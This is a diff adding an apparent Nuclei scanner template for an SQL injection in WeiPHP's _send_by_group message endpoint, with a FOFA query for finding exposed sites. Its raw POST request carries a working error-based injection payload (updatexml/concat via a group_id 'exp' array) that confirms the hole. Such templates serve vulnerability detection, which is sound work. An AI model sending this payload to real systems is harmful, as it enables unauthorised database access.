@@ -1,0 +1,26 @@
+id: weiphp-cms-send-by-group-sqli
+
+info:
+  name: WeiPHP _send_by_group 接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/css/weiphp.css" || body="WeiPHP"
+      该漏洞源于WeiPHP系统中_send_by_group接口未正确过滤用户输入的SQL参数，导致攻击者可通过构造恶意请求执行任意SQL语句。此漏洞可能引发敏感数据泄露、数据库结构篡改或服务可用性受损。受影响组件涉及消息群发功能的核心数据处理模块。
+  tags: weiphp
+
+http:
+- raw:
+  - |
+    POST /public/index.php/weixin/message/_send_by_group HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28%2F%2A%2150000select%2A%2F+123456ww%29%2C0x7e%29%2C1%29+--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - '123456ww'
